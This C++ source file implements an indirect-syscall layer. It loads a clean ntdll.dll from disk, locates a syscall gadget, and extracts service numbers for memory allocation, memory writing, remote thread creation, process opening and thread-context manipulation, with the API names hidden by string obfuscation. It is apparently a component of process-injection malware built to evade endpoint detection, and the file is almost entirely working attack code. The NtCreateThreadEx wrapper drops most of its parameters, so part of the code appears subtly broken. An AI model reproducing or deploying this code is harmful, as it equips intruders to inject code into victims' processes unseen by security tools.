#include "../include/IndirectSyscalls.h"
#include "../include/StringObfuscation.h"
#include <stdio.h>
#include <string.h>

SYSCALL_STATE IndirectSyscalls::g_State = {NULL, 0, NULL, FALSE};
SYSCALL_TABLE IndirectSyscalls::g_SSNs = {0};

BOOL IndirectSyscalls::LoadFreshNtdll()
{
    CHAR ntdllPath[MAX_PATH];
    GetSystemDirectoryA(ntdllPath, MAX_PATH);
    const char *ntdllName = OBFUSCATE("\\ntdll.dll");
    lstrcatA(ntdllPath, ntdllName);

    HANDLE hFile = CreateFileA(ntdllPath, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        return FALSE;
    }

    g_State.NtdllSize = GetFileSize(hFile, NULL);
    g_State.FreshNtdll = VirtualAlloc(NULL, g_State.NtdllSize,
                                      MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!g_State.FreshNtdll)
    {
        CloseHandle(hFile);
        return FALSE;
    }

    DWORD bytesRead;
    if (!ReadFile(hFile, g_State.FreshNtdll, g_State.NtdllSize, &bytesRead, NULL))
    {
        CloseHandle(hFile);
        VirtualFree(g_State.FreshNtdll, 0, MEM_RELEASE);
        return FALSE;
    }

    CloseHandle(hFile);
    return TRUE;
}

PVOID IndirectSyscalls::FindSyscallGadget(PVOID moduleBase)
{
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleBase;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE)
    {
        return NULL;
    }

    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)((BYTE *)moduleBase + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE)
    {
        return NULL;
    }

    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    PVOID textBase = NULL;
    DWORD textSize = 0;

    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
    {
        if (memcmp(section[i].Name, ".text", 5) == 0)
        {
            textBase = (BYTE *)moduleBase + section[i].VirtualAddress;
            textSize = section[i].Misc.VirtualSize;
            break;
        }
    }

    if (!textBase)
        return NULL;

    BYTE *current = (BYTE *)textBase;
    BYTE *end = current + textSize - 2;

    while (current < end)
    {
        if (current[0] == 0x0F && current[1] == 0x05 && current[2] == 0xC3)
        {
            return current;
        }
        current++;
    }

    return NULL;
}

PVOID IndirectSyscalls::GetFunctionAddress(PVOID moduleBase, const char *functionName)
{
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleBase;
    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)((BYTE *)moduleBase + dosHeader->e_lfanew);

    DWORD exportDirRva = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!exportDirRva)
        return NULL;

    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE *)moduleBase + exportDirRva);
    DWORD *addressOfFunctions = (DWORD *)((BYTE *)moduleBase + exportDir->AddressOfFunctions);
    DWORD *addressOfNames = (DWORD *)((BYTE *)moduleBase + exportDir->AddressOfNames);
    WORD *addressOfNameOrdinals = (WORD *)((BYTE *)moduleBase + exportDir->AddressOfNameOrdinals);

    for (DWORD i = 0; i < exportDir->NumberOfNames; i++)
    {
        char *currentName = (char *)((BYTE *)moduleBase + addressOfNames[i]);

        if (strcmp(currentName, functionName) == 0)
        {
            WORD ordinal = addressOfNameOrdinals[i];
            DWORD functionRva = addressOfFunctions[ordinal];
            return (BYTE *)moduleBase + functionRva;
        }
    }

    return NULL;
}

DWORD IndirectSyscalls::ExtractSSN(PVOID functionAddress)
{
    BYTE *bytes = (BYTE *)functionAddress;

    if (bytes[0] != 0x4C || bytes[1] != 0x8B || bytes[2] != 0xD1 || bytes[3] != 0xB8)
    {
        return 0;
    }

    return *(DWORD *)(bytes + 4);
}

BOOL IndirectSyscalls::Initialize()
{
    if (g_State.Initialized)
    {
        return TRUE;
    }

    if (!LoadFreshNtdll())
    {
        return FALSE;
    }

    g_State.SyscallGadget = FindSyscallGadget(g_State.FreshNtdll);
    if (!g_State.SyscallGadget)
    {
        VirtualFree(g_State.FreshNtdll, 0, MEM_RELEASE);
        return FALSE;
    }

    DWORD oldProtect;
    if (!VirtualProtect(g_State.FreshNtdll, g_State.NtdllSize, PAGE_EXECUTE_READ, &oldProtect))
    {
        VirtualFree(g_State.FreshNtdll, 0, MEM_RELEASE);
        return FALSE;
    }

    PVOID funcAddr;

    funcAddr = GetFunctionAddress(g_State.FreshNtdll, OBFUSCATE("NtAllocateVirtualMemory"));
    if (funcAddr)
        g_SSNs.NtAllocateVirtualMemory = ExtractSSN(funcAddr);

    funcAddr = GetFunctionAddress(g_State.FreshNtdll, OBFUSCATE("NtWriteVirtualMemory"));
    if (funcAddr)
        g_SSNs.NtWriteVirtualMemory = ExtractSSN(funcAddr);

    funcAddr = GetFunctionAddress(g_State.FreshNtdll, OBFUSCATE("NtProtectVirtualMemory"));
    if (funcAddr)
        g_SSNs.NtProtectVirtualMemory = ExtractSSN(funcAddr);

    funcAddr = GetFunctionAddress(g_State.FreshNtdll, OBFUSCATE("NtCreateThreadEx"));
    if (funcAddr)
        g_SSNs.NtCreateThreadEx = ExtractSSN(funcAddr);

    funcAddr = GetFunctionAddress(g_State.FreshNtdll, OBFUSCATE("NtOpenProcess"));
    if (funcAddr)
        g_SSNs.NtOpenProcess = ExtractSSN(funcAddr);

    funcAddr = GetFunctionAddress(g_State.FreshNtdll, OBFUSCATE("NtReadVirtualMemory"));
    if (funcAddr)
        g_SSNs.NtReadVirtualMemory = ExtractSSN(funcAddr);

    funcAddr = GetFunctionAddress(g_State.FreshNtdll, OBFUSCATE("NtQuerySystemInformation"));
    if (funcAddr)
        g_SSNs.NtQuerySystemInformation = ExtractSSN(funcAddr);

    funcAddr = GetFunctionAddress(g_State.FreshNtdll, OBFUSCATE("NtClose"));
    if (funcAddr)
        g_SSNs.NtClose = ExtractSSN(funcAddr);

    funcAddr = GetFunctionAddress(g_State.FreshNtdll, OBFUSCATE("NtGetContextThread"));
    if (funcAddr)
        g_SSNs.NtGetContextThread = ExtractSSN(funcAddr);

    funcAddr = GetFunctionAddress(g_State.FreshNtdll, OBFUSCATE("NtSetContextThread"));
    if (funcAddr)
        g_SSNs.NtSetContextThread = ExtractSSN(funcAddr);

    funcAddr = GetFunctionAddress(g_State.FreshNtdll, OBFUSCATE("NtSuspendThread"));
    if (funcAddr)
        g_SSNs.NtSuspendThread = ExtractSSN(funcAddr);

    funcAddr = GetFunctionAddress(g_State.FreshNtdll, OBFUSCATE("NtResumeThread"));
    if (funcAddr)
        g_SSNs.NtResumeThread = ExtractSSN(funcAddr);

    g_State.Initialized = TRUE;
    return TRUE;
}

void IndirectSyscalls::Cleanup()
{
    if (g_State.FreshNtdll)
    {
        VirtualFree(g_State.FreshNtdll, 0, MEM_RELEASE);
        g_State.FreshNtdll = NULL;
    }
    g_State.Initialized = FALSE;
}

// SYSCALL WRAPPERS

NTSTATUS IndirectSyscalls::SysNtAllocateVirtualMemory(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect)
{
    if (!g_State.Initialized)
        return -1;

    return DoSyscall(
        g_SSNs.NtAllocateVirtualMemory,
        g_State.SyscallGadget,
        (PVOID)ProcessHandle,
        (PVOID)BaseAddress,
        (PVOID)ZeroBits,
        (PVOID)RegionSize,
        (PVOID)(ULONG_PTR)AllocationType,
        (PVOID)(ULONG_PTR)Protect);
}

NTSTATUS IndirectSyscalls::SysNtWriteVirtualMemory(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten)
{
    if (!g_State.Initialized)
        return -1;

    return DoSyscall(
        g_SSNs.NtWriteVirtualMemory,
        g_State.SyscallGadget,
        (PVOID)ProcessHandle,
        BaseAddress,
        Buffer,
        (PVOID)NumberOfBytesToWrite,
        (PVOID)NumberOfBytesWritten,
        NULL);
}

NTSTATUS IndirectSyscalls::SysNtProtectVirtualMemory(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    PSIZE_T NumberOfBytesToProtect,
    ULONG NewAccessProtection,
    PULONG OldAccessProtection)
{
    if (!g_State.Initialized)
        return -1;

    return DoSyscall(
        g_SSNs.NtProtectVirtualMemory,
        g_State.SyscallGadget,
        (PVOID)ProcessHandle,
        (PVOID)BaseAddress,
        (PVOID)NumberOfBytesToProtect,
        (PVOID)(ULONG_PTR)NewAccessProtection,
        (PVOID)OldAccessProtection,
        NULL);
}

NTSTATUS IndirectSyscalls::SysNtCreateThreadEx(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList)
{
    if (!g_State.Initialized)
        return -1;

    return DoSyscall(
        g_SSNs.NtCreateThreadEx,
        g_State.SyscallGadget,
        (PVOID)ThreadHandle,
        (PVOID)DesiredAccess,
        ObjectAttributes,
        (PVOID)ProcessHandle,
        StartRoutine,
        Argument);
}

NTSTATUS IndirectSyscalls::SysNtOpenProcess(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    PVOID ClientId)
{
    if (!g_State.Initialized)
        return -1;

    return DoSyscall(
        g_SSNs.NtOpenProcess,
        g_State.SyscallGadget,
        (PVOID)ProcessHandle,
        (PVOID)DesiredAccess,
        ObjectAttributes,
        ClientId,
        NULL,
        NULL);
}

NTSTATUS IndirectSyscalls::SysNtReadVirtualMemory(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToRead,
    PSIZE_T NumberOfBytesRead)
{
    if (!g_State.Initialized)
        return -1;

    return DoSyscall(
        g_SSNs.NtReadVirtualMemory,
        g_State.SyscallGadget,
        (PVOID)ProcessHandle,
        BaseAddress,
        Buffer,
        (PVOID)NumberOfBytesToRead,
        (PVOID)NumberOfBytesRead,
        NULL);
}

NTSTATUS IndirectSyscalls::SysNtQuerySystemInformation(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength)
{
    if (!g_State.Initialized)
        return -1;

    return DoSyscall(
        g_SSNs.NtQuerySystemInformation,
        g_State.SyscallGadget,
        (PVOID)(ULONG_PTR)SystemInformationClass,
        SystemInformation,
        (PVOID)(ULONG_PTR)SystemInformationLength,
        (PVOID)ReturnLength,
        NULL,
        NULL);
}

NTSTATUS IndirectSyscalls::SysNtClose(HANDLE Handle)
{
    if (!g_State.Initialized)
        return -1;

    return DoSyscall(
        g_SSNs.NtClose,
        g_State.SyscallGadget,
        (PVOID)Handle,
        NULL,
        NULL,
        NULL,
        NULL,
        NULL);
}

// THREAD MANIPULATION SYSCALLS (replaces KERNEL32 IAT)

NTSTATUS IndirectSyscalls::SysNtGetContextThread(
    HANDLE ThreadHandle,
    PCONTEXT ThreadContext)
{
    if (!g_State.Initialized)
        return -1;

    return DoSyscall(
        g_SSNs.NtGetContextThread,
        g_State.SyscallGadget,
        (PVOID)ThreadHandle,
        (PVOID)ThreadContext,
        NULL,
        NULL,
        NULL,
        NULL);
}

NTSTATUS IndirectSyscalls::SysNtSetContextThread(
    HANDLE ThreadHandle,
    PCONTEXT ThreadContext)
{
    if (!g_State.Initialized)
        return -1;

    return DoSyscall(
        g_SSNs.NtSetContextThread,
        g_State.SyscallGadget,
        (PVOID)ThreadHandle,
        (PVOID)ThreadContext,
        NULL,
        NULL,
        NULL,
        NULL);
}

NTSTATUS IndirectSyscalls::SysNtSuspendThread(
    HANDLE ThreadHandle,
    PULONG PreviousSuspendCount)
{
    if (!g_State.Initialized)
        return -1;

    return DoSyscall(
        g_SSNs.NtSuspendThread,
        g_State.SyscallGadget,
        (PVOID)ThreadHandle,
        (PVOID)PreviousSuspendCount,
        NULL,
        NULL,
        NULL,
        NULL);
}

NTSTATUS IndirectSyscalls::SysNtResumeThread(
    HANDLE ThreadHandle,
    PULONG PreviousSuspendCount)
{
    if (!g_State.Initialized)
        return -1;

    return DoSyscall(
        g_SSNs.NtResumeThread,
        g_State.SyscallGadget,
        (PVOID)ThreadHandle,
        (PVOID)PreviousSuspendCount,
        NULL,
        NULL,
        NULL,
        NULL);
}